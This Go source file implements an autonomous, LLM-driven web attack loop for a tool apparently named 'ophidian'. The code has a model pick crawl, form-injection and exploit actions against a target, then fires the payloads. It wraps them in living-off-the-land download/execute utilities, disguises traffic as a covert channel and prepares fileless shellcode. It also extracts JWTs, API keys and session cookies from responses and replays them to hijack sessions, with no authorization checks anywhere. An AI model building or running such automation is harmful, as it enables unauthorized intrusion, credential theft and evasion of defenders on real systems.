package cognitive

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"regexp"
	"strings"
	"time"

	"github.com/ophidian/ophidian/internal/application/opsec"
	"github.com/ophidian/ophidian/internal/domain/mission"
	"github.com/ophidian/ophidian/internal/infrastructure/crawler"
	"github.com/ophidian/ophidian/pkg/exploit"
)

type LLMClient interface {
	Generate(ctx context.Context, prompt string) (string, error)
}

type EventAppender interface {
	Append(ctx context.Context, event interface{}) error
}

type AdaptiveLoopConfig struct {
	MaxIterations int
	LLMTimeout    time.Duration
	Logger        *log.Logger
}

type AdaptiveLoop struct {
	config          AdaptiveLoopConfig
	crawler         *crawler.Crawler
	attacker        *crawler.HTTPAttacker
	llm             LLMClient
	prompt          *OffensivePromptBuilder
	parser          *DecisionParser
	ctx             *AttackContext
	eventApp        EventAppender
	exploitRegistry *exploit.ExploitRegistry
	exploitFetcher  *exploit.ExploitFetcher
	lotlDB          *opsec.LotLDatabase
	trafficMorph    *opsec.TrafficMorphEngine
	memoryExec      *opsec.MemoryExecutionEngine
}

func NewAdaptiveLoop(config AdaptiveLoopConfig, llm LLMClient, eventApp EventAppender) *AdaptiveLoop {
	if config.MaxIterations <= 0 {
		config.MaxIterations = 20
	}
	if config.LLMTimeout <= 0 {
		config.LLMTimeout = 60 * time.Second
	}
	if config.Logger == nil {
		config.Logger = log.Default()
	}

	registry := exploit.NewExploitRegistry("/tmp/ophidian-exploits")
	fetcher := exploit.NewExploitFetcher("/tmp/ophidian-exploits")
	fetcher.SeedDefaultExploits(registry)

	trafficMorph := opsec.NewTrafficMorphEngine(opsec.CovertChannelConfig{
		Type:         opsec.ChannelHTTPS,
		MorphEnabled: true,
		PaddingSize:  128,
	}, opsec.NewSimpleCrypto(0x42))

	return &AdaptiveLoop{
		config:          config,
		crawler:         crawler.NewCrawler(3),
		attacker:        crawler.NewHTTPAttacker(),
		llm:             llm,
		prompt:          NewOffensivePromptBuilder(),
		parser:          NewDecisionParser(),
		eventApp:        eventApp,
		exploitRegistry: registry,
		exploitFetcher:  fetcher,
		lotlDB:          opsec.NewLotLDatabase(),
		trafficMorph:    trafficMorph,
		memoryExec:      opsec.NewMemoryExecutionEngine(nil),
	}
}

type AdaptiveLoopResult struct {
	Target        string
	TotalAttempts int
	SuccessCount  int
	Completed     bool
	StopReason    string
	History       []crawler.HTTPTransaction
}

func (l *AdaptiveLoop) Run(ctx context.Context, target string, reconResult *ReconSummary) (*AdaptiveLoopResult, error) {
	l.config.Logger.Printf("ADAPTIVE: starting attack loop on %s (max %d iterations)", target, l.config.MaxIterations)

	l.ctx = NewAttackContext(target)
	l.seedFromRecon(reconResult)
	l.matchCVEs()

	initialPage, err := l.crawler.Crawl(target)
	if err != nil {
		l.config.Logger.Printf("ADAPTIVE: initial crawl failed: %v", err)
	} else {
		l.ctx.AddPage(crawledPageToContext(initialPage))
	}

	for iter := 1; iter <= l.config.MaxIterations; iter++ {
		select {
		case <-ctx.Done():
			return l.buildResult(false, "context cancelled"), ctx.Err()
		default:
		}

		l.config.Logger.Printf("ADAPTIVE: iteration %d/%d | crawled=%d attempts=%d success=%d",
			iter, l.config.MaxIterations, len(l.ctx.CrawledPages), l.ctx.TotalAttempts(), l.ctx.SuccessCount())

		prompt := l.prompt.BuildIterationContext(l.ctx, iter)

		llmCtx, cancel := context.WithTimeout(ctx, l.config.LLMTimeout)
		response, err := l.llm.Generate(llmCtx, prompt)
		cancel()
		if err != nil {
			l.config.Logger.Printf("ADAPTIVE: LLM error: %v", err)
			if iter <= 3 {
				l.config.Logger.Printf("ADAPTIVE: retrying (early iteration, possible transient error)")
				continue
			}
			return l.buildResult(false, fmt.Sprintf("LLM failed at iteration %d: %v", iter, err)), nil
		}

		decision, err := l.parser.Parse(response)
		if err != nil {
			l.config.Logger.Printf("ADAPTIVE: parse error: %v | raw=%s", err, truncateString(response, 100))
			continue
		}

		l.config.Logger.Printf("ADAPTIVE: AI decision: %s → %s %s (%.0f%%)",
			decision.Action, decision.Method, decision.TargetURL, decision.Confidence*100)

		l.ctx.AddDecision(*decision)

		if decision.Action == "STOP" {
			l.config.Logger.Printf("ADAPTIVE: AI decided to stop: %s", decision.Reasoning)
			return l.buildResult(true, "AI requested STOP"), nil
		}

		attempt := l.executeDecision(ctx, decision)
		if attempt != nil {
			l.ctx.AddAttempt(*attempt)
			l.appendAdaptiveEvent(target, decision, attempt)
			if attempt.Success {
				l.checkSession(decision.TargetURL)
			}
		}
	}

	return l.buildResult(true, "max iterations reached"), nil
}

func (l *AdaptiveLoop) executeDecision(ctx context.Context, decision *AIDecision) *ActionAttempt {
	switch decision.Action {
	case "CRAWL":
		return l.executeCrawl(decision)
	case "SUBMIT_FORM":
		return l.executeSubmitForm(decision)
	case "EXPLOIT", "ESCALATE":
		return l.executeExploit(decision)
	default:
		l.config.Logger.Printf("ADAPTIVE: unknown action %s, skipping", decision.Action)
		return nil
	}
}

func (l *AdaptiveLoop) executeCrawl(decision *AIDecision) *ActionAttempt {
	page, err := l.crawler.Crawl(decision.TargetURL)
	if err != nil {
		return &ActionAttempt{
			Method: "GET", URL: decision.TargetURL,
			Payload: "crawl", StatusCode: 0,
			BodyPreview: err.Error(), Success: false,
			Analysis: "crawl failed",
		}
	}

	l.ctx.AddPage(crawledPageToContext(page))

	linksStr := strings.Join(page.Links, ", ")
	if len(linksStr) > 200 {
		linksStr = linksStr[:200] + "..."
	}
	formsCount := len(page.Forms)
	analysis := fmt.Sprintf("Crawl berhasil: %d forms, %d links ditemukan", formsCount, len(page.Links))

	return &ActionAttempt{
		Method: "GET", URL: decision.TargetURL,
		Payload: "crawl", StatusCode: page.StatusCode,
		BodyPreview: page.BodyPreview, Success: true, Analysis: analysis,
	}
}

func (l *AdaptiveLoop) executeSubmitForm(decision *AIDecision) *ActionAttempt {
	form, found := l.findForm(decision.TargetURL)
	if !found {
		return &ActionAttempt{
			Method: decision.Method, URL: decision.TargetURL,
			Payload: decision.Payload, StatusCode: 0,
			BodyPreview: "Form not found in crawled pages", Success: false,
			Analysis: "target form tidak ditemukan — perlu CRAWL ulang",
		}
	}

	params := make(map[string]string)
	cleanParams := make(map[string]string)
	for _, input := range form.Inputs {
		if input.Type == "submit" || input.Type == "button" {
			continue
		}
		params[input.Name] = decision.Payload
		cleanParams[input.Name] = "test"
	}

	resp, err := l.attacker.SubmitForm(decision.TargetURL, decision.Method, params)
	if err != nil {
		return &ActionAttempt{
			Method: decision.Method, URL: decision.TargetURL,
			Payload: decision.Payload, StatusCode: 0,
			BodyPreview: err.Error(), Success: false,
			Analysis: "form submission error",
		}
	}

	success, analysis := analyzeResponse(resp, decision)

	cleanResp, cleanErr := l.attacker.SubmitForm(decision.TargetURL, decision.Method, cleanParams)
	if cleanErr == nil && cleanResp != nil {
		diff := resp.Length - cleanResp.Length
		if diff > 200 || diff < -200 {
			blindMsg := fmt.Sprintf("BLIND: response length anomaly %d bytes (clean=%d injected=%d)",
				diff, cleanResp.Length, resp.Length)
			analysis += " | " + blindMsg
			success = true
		}
	}

	if strings.Contains(analysis, "DETECTED:") {
		l.ctx.VulnerabilityIndicators = append(l.ctx.VulnerabilityIndicators, analysis)
	}
	return &ActionAttempt{
		Method: decision.Method, URL: decision.TargetURL,
		Payload: decision.Payload, StatusCode: resp.StatusCode,
		BodyPreview: truncateString(resp.Body, 300), Success: success, Analysis: analysis,
	}
}

func (l *AdaptiveLoop) executeExploit(decision *AIDecision) *ActionAttempt {
	headers := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	}

	payload := decision.Payload
	utility := l.selectLoLTechnique()
	if utility != nil {
		l.config.Logger.Printf("ADAPTIVE: using LoL technique: %s (%s) risk=%d", utility.Name, utility.Path, utility.DetectionRisk)
		payload = fmt.Sprintf("%s %s %s", utility.Path, utility.Args, decision.Payload)
	}

	if l.trafficMorph != nil {
		morphed, err := l.trafficMorph.MorphTraffic(context.Background(), []byte(payload), opsec.ChannelHTTPS)
		if err == nil {
			payload = string(morphed)
			headers["Content-Type"] = "application/json"
			l.config.Logger.Printf("ADAPTIVE: payload morphed to HTTPS covert channel (%d bytes)", len(morphed))
		}
	}
	if l.memoryExec != nil {
		encodedPayload := l.memoryExec.EncodePayload([]byte(decision.Payload))
		l.config.Logger.Printf("ADAPTIVE: fileless execution ready — payload encoded len=%d", len(encodedPayload))
		l.ctx.VulnerabilityIndicators = append(l.ctx.VulnerabilityIndicators,
			"FILELESS: payload ready for memory-only execution (shellcode="+fmt.Sprint(len(decision.Payload))+" bytes)")
	}

	if len(l.ctx.StolenSessions) > 0 {
		lastStolen := l.ctx.StolenSessions[len(l.ctx.StolenSessions)-1]
		switch lastStolen.TokenType {
		case "JWT":
			headers["Authorization"] = "Bearer " + lastStolen.Token
		case "API_KEY":
			headers["X-API-Key"] = lastStolen.Token
		case "SESSION_ID":
			if headers["Cookie"] == "" {
				headers["Cookie"] = "session=" + lastStolen.Token
			}
		}
		l.config.Logger.Printf("ADAPTIVE: replaying stolen %s from %s", lastStolen.TokenType, lastStolen.SourceURL)
	}

	resp, err := l.attacker.SendRaw(decision.Method, decision.TargetURL, payload, headers)
	if err != nil {
		return &ActionAttempt{
			Method: decision.Method, URL: decision.TargetURL,
			Payload: decision.Payload, StatusCode: 0,
			BodyPreview: err.Error(), Success: false,
			Analysis: "request error — mungkin target tidak reachable",
		}
	}

	success, analysis := analyzeResponse(resp, decision)
	if strings.Contains(analysis, "DETECTED:") {
		l.ctx.VulnerabilityIndicators = append(l.ctx.VulnerabilityIndicators, analysis)
	}
	return &ActionAttempt{
		Method: decision.Method, URL: decision.TargetURL,
		Payload: decision.Payload, StatusCode: resp.StatusCode,
		BodyPreview: truncateString(resp.Body, 300), Success: success, Analysis: analysis,
	}
}

func (l *AdaptiveLoop) findForm(targetURL string) (*DiscoveredForm, bool) {
	for _, page := range l.ctx.CrawledPages {
		for i := range page.Forms {
			formURL := page.Forms[i].Action
			if formURL == "" || strings.Contains(targetURL, formURL) || strings.Contains(formURL, targetURL) {
				return &page.Forms[i], true
			}
		}
		pageURL := page.URL
		if strings.Contains(targetURL, pageURL) || strings.Contains(pageURL, targetURL) {
			for i := range page.Forms {
				return &page.Forms[i], true
			}
		}
	}
	return nil, false
}

func (l *AdaptiveLoop) seedFromRecon(recon *ReconSummary) {
	if recon == nil {
		return
	}
	for _, tech := range recon.TechStack {
		l.ctx.AddTech(tech)
	}
	l.ctx.SecurityHeaders = recon.SecurityHeaders
	l.ctx.MissingHeaders = recon.MissingHeaders
	l.ctx.SSLInfo = recon.SSLInfo
	l.ctx.Subdomains = recon.Subdomains
}

func (l *AdaptiveLoop) matchCVEs() {
	if l.exploitRegistry == nil {
		return
	}

	techStr := strings.Join(l.ctx.TechStack, " ")
	techLower := strings.ToLower(techStr)
	var queries []string

	serviceMap := map[string]string{
		"apache": "apache", "httpd": "apache", "apache2": "apache",
		"nginx": "nginx", "iis": "microsoft", "microsoft": "microsoft",
		"tomcat": "java", "java": "java", "spring": "java",
		"php": "php", "mysql": "mysql", "mariadb": "mysql",
		"postgresql": "postgres", "postgres": "postgres",
		"wordpress": "php", "joomla": "php", "drupal": "php",
		"python": "python", "django": "python", "flask": "python",
		"node": "javascript", "express": "javascript",
	}

	for keyword, query := range serviceMap {
		if strings.Contains(techLower, keyword) {
			queries = append(queries, query)
		}
	}

	seen := make(map[string]bool)
	var unique []string
	for _, q := range queries {
		if !seen[q] {
			seen[q] = true
			unique = append(unique, q)
		}
	}
	queries = unique

	for _, q := range queries {
		matches := l.exploitRegistry.Search(q)
		for _, match := range matches {
			exists := false
			for _, existing := range l.ctx.MatchingCVEs {
				if existing.CVE == match.CVE {
					exists = true
					break
				}
			}
			if exists {
				continue
			}

			l.ctx.MatchingCVEs = append(l.ctx.MatchingCVEs, MatchedCVE{
				CVE:         match.CVE,
				Description: match.Description,
				CVSS:        match.CVSS,
				Severity:    match.Severity,
				Platform:    match.Platform,
				MatchReason: fmt.Sprintf("tech stack keyword '%s' matches tag in exploit DB", q),
			})
		}
	}

	if len(l.ctx.MatchingCVEs) > 0 {
		l.config.Logger.Printf("ADAPTIVE: matched %d CVE(s) to tech stack (keywords: %s)",
			len(l.ctx.MatchingCVEs), strings.Join(unique, ", "))
	}
}

func (l *AdaptiveLoop) detectOS() opsec.OSType {
	techStr := strings.ToLower(strings.Join(l.ctx.TechStack, " "))
	if strings.Contains(techStr, "windows") || strings.Contains(techStr, "iis") || strings.Contains(techStr, "asp") {
		return opsec.OSWindows
	}
	return opsec.OSLinux
}

func (l *AdaptiveLoop) selectLoLTechnique() *opsec.Utility {
	osType := l.detectOS()
	utils := l.lotlDB.FindUtilities(osType, "download")
	if len(utils) == 0 {
		utils = l.lotlDB.FindUtilities(osType, "execute")
	}
	if len(utils) == 0 {
		utils = l.lotlDB.FindUtilities(osType, "command")
	}
	if len(utils) > 0 {
		best := l.lotlDB.FindBestUtility(osType, utils[0].Capabilities[0])
		if best != nil {
			return best
		}
		return &utils[0]
	}
	return nil
}

func (l *AdaptiveLoop) checkSession(targetURL string) {
	cookies := l.attacker.GetCookies(targetURL)
	if len(cookies) == 0 && l.ctx.Session == nil {
		return
	}

	var cookieStrs []string
	for _, c := range cookies {
		cookieStrs = append(cookieStrs, c.Name+"="+c.Value)
	}

	if l.ctx.Session == nil {
		l.ctx.Session = &SessionState{
			Active:    len(cookies) > 0,
			Cookies:   cookieStrs,
			SourceURL: targetURL,
		}
	}

	if len(cookies) > 0 {
		l.ctx.Session.Cookies = cookieStrs
		l.ctx.Session.Active = true
		l.config.Logger.Printf("ADAPTIVE: session updated at %s (%d cookies: %s)",
			targetURL, len(cookies), strings.Join(cookieStrs, ", "))
	}

	if len(l.attacker.GetHistory()) == 0 {
		return
	}
	lastResp := &l.attacker.GetHistory()[len(l.attacker.GetHistory())-1].Response

	tokens := extractTokens(lastResp)
	for _, t := range tokens {
		tokenPreview := t
		if len(tokenPreview) > 30 {
			tokenPreview = tokenPreview[:30] + "..."
		}
		tokenType := detectTokenType(t)
		l.ctx.StolenSessions = append(l.ctx.StolenSessions, StolenSession{
			Token:      tokenPreview,
			TokenType:  tokenType,
			SourceURL:  targetURL,
			CapturedAt: time.Now().Format(time.RFC3339),
		})
		if tokenType == "JWT" {
			l.ctx.Session.Indicators = append(l.ctx.Session.Indicators, "JWT_FOUND")
		}
		if tokenType == "SESSION_ID" || tokenType == "API_KEY" {
			l.ctx.Session.Indicators = append(l.ctx.Session.Indicators, tokenType+"_FOUND")
		}
	}

	body := strings.ToLower(lastResp.Body)
	hijackPatterns := []string{"admin", "dashboard", "welcome back", "logout",
		"user management", "control panel", "cpanel", "administrator"}
	for _, p := range hijackPatterns {
		if strings.Contains(body, p) {
			l.ctx.Session.Indicators = append(l.ctx.Session.Indicators, "HIJACK: "+p)
			l.config.Logger.Printf("ADAPTIVE: session hijack detected — '%s' found in response", p)
			break
		}
	}

	if len(tokens) > 0 {
		l.config.Logger.Printf("ADAPTIVE: %d token(s) extracted (%s)", len(tokens),
			strings.Join(tokenTypes(tokens), ", "))
	}
}

var (
	jwtRe    = regexp.MustCompile(`eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}`)
	jsonRe   = regexp.MustCompile(`"(?:access_?token|session_?id|api_?key|auth_?token|jwt)"\s*:\s*"([^"]+)"`)
	cookieRe = regexp.MustCompile(`document\.cookie\s*=\s*['"]([^'"]+)['"]`)
)

func extractTokens(resp *crawler.HTTPResponseDetail) []string {
	seen := make(map[string]bool)
	var tokens []string

	for _, match := range jwtRe.FindAllString(resp.Body, -1) {
		if !seen[match] {
			seen[match] = true
			tokens = append(tokens, match)
		}
	}

	for _, match := range jsonRe.FindAllStringSubmatch(resp.Body, -1) {
		if len(match) > 1 && !seen[match[1]] {
			seen[match[1]] = true
			tokens = append(tokens, match[1])
		}
	}

	for _, match := range cookieRe.FindAllStringSubmatch(resp.Body, -1) {
		if len(match) > 1 && !seen[match[1]] {
			seen[match[1]] = true
			tokens = append(tokens, match[1])
		}
	}

	return tokens
}

func detectTokenType(token string) string {
	if strings.HasPrefix(token, "eyJ") {
		return "JWT"
	}
	if len(token) == 32 || len(token) == 64 {
		return "API_KEY"
	}
	if len(token) == 26 || len(token) == 128 {
		return "SESSION_ID"
	}
	return "TOKEN"
}

func tokenTypes(tokens []string) []string {
	var types []string
	seen := make(map[string]bool)
	for _, t := range tokens {
		tt := detectTokenType(t)
		if !seen[tt] {
			seen[tt] = true
			types = append(types, tt)
		}
	}
	return types
}

func (l *AdaptiveLoop) buildResult(completed bool, stopReason string) *AdaptiveLoopResult {
	return &AdaptiveLoopResult{
		Target:        l.ctx.Target,
		TotalAttempts: l.ctx.TotalAttempts(),
		SuccessCount:  l.ctx.SuccessCount(),
		Completed:     completed,
		StopReason:    stopReason,
		History:       l.attacker.GetHistory(),
	}
}

func (l *AdaptiveLoop) appendAdaptiveEvent(target string, decision *AIDecision, attempt *ActionAttempt) {
	if l.eventApp == nil {
		return
	}
	payload, _ := json.Marshal(map[string]interface{}{
		"target":      target,
		"action":      decision.Action,
		"url":         decision.TargetURL,
		"payload":     decision.Payload,
		"status_code": attempt.StatusCode,
		"success":     attempt.Success,
		"analysis":    attempt.Analysis,
		"timestamp":   time.Now().UTC().Format(time.RFC3339),
	})
	event := mission.AdaptiveActionEvent{Payload: payload}
	_ = l.eventApp.Append(context.Background(), event)
}

type ReconSummary struct {
	TechStack       []string
	SecurityHeaders []string
	MissingHeaders  []string
	SSLInfo         string
	Subdomains      []string
}

func analyzeResponse(resp *crawler.HTTPResponseDetail, decision *AIDecision) (bool, string) {
	body := strings.ToLower(resp.Body)
	var indicators []string

	check := func(patterns []string, label string) {
		for _, p := range patterns {
			if strings.Contains(body, p) {
				indicators = append(indicators, label+": "+p)
				return
			}
		}
	}

	check([]string{"mysql_fetch", "you have an error in your sql", "mysql_num_rows", "warning: mysql", "check the manual"}, "SQLI_MYSQL")
	check([]string{"pg_query", "psql:", "postgresql", "unterminated quoted string"}, "SQLI_POSTGRES")
	check([]string{"microsoft ole db", "odbc sql server", "incorrect syntax near", "unclosed quotation mark", "sqlsrv"}, "SQLI_MSSQL")
	check([]string{"ora-", "oracle", "pls-", "tns:"}, "SQLI_ORACLE")
	check([]string{"root:x:0:", "daemon:*:", "/etc/passwd", "bin/bash", "nobody:*:"}, "LFI_SUCCESS")
	check([]string{"failed to open stream", "include_path", "require_once", "failed opening", "include("}, "RFI_LFI")
	check([]string{"cloudflare", "mod_security", "access denied", "request blocked", "captcha"}, "WAF")
	check([]string{"index of /", "parent directory", "last modified</a>", "directory listing"}, "DIR_LISTING")
	check([]string{"stack trace", "traceback", "exception:", "fatal error", "on line", "call stack", "debug mode"}, "DEBUG")
	check([]string{"permission denied", "unauthorized", "forbidden"}, "ACCESS_DENIED")

	if strings.Contains(body, "apache/") || strings.Contains(body, "nginx/") || strings.Contains(body, "php/") {
		indicators = append(indicators, "VERSION_LEAK")
	}
	if resp.StatusCode == 500 {
		indicators = append(indicators, "500_CRASH: payload caused server error")
	}
	if resp.StatusCode == 200 && resp.Length == 0 {
		indicators = append(indicators, "EMPTY_200: possible blind injection")
	}
	if resp.StatusCode == 200 && resp.Length > 0 && containsAny(body, "welcome", "dashboard", "admin") {
		indicators = append(indicators, "AUTH_BYPASS: accessed restricted area")
	}

	for _, expected := range decision.ExpectedIndicators {
		if strings.Contains(body, strings.ToLower(expected)) {
			indicators = append(indicators, "EXPECTED: "+expected)
		}
	}

	success := len(indicators) > 0 && resp.StatusCode < 500

	analysis := fmt.Sprintf("%s %s → [%d] %d bytes",
		decision.Method, decision.TargetURL, resp.StatusCode, resp.Length)
	if len(indicators) > 0 {
		analysis += " | DETECTED: " + strings.Join(indicators, "; ")
	}

	return success, analysis
}

func containsAny(body string, patterns ...string) bool {
	for _, p := range patterns {
		if strings.Contains(body, p) {
			return true
		}
	}
	return false
}

func crawledPageToContext(p *crawler.CrawledPage) CrawledPage {
	forms := make([]DiscoveredForm, len(p.Forms))
	for i, f := range p.Forms {
		inputs := make([]FormInput, len(f.Inputs))
		for j, in := range f.Inputs {
			inputs[j] = FormInput{Name: in.Name, Type: in.Type}
		}
		forms[i] = DiscoveredForm{
			Action: f.Action,
			Method: f.Method,
			Inputs: inputs,
		}
	}
	return CrawledPage{
		URL:         p.URL,
		Method:      p.Method,
		StatusCode:  p.StatusCode,
		Title:       p.Title,
		Server:      p.Server,
		BodyPreview: p.BodyPreview,
		Forms:       forms,
		Links:       p.Links,
	}
}
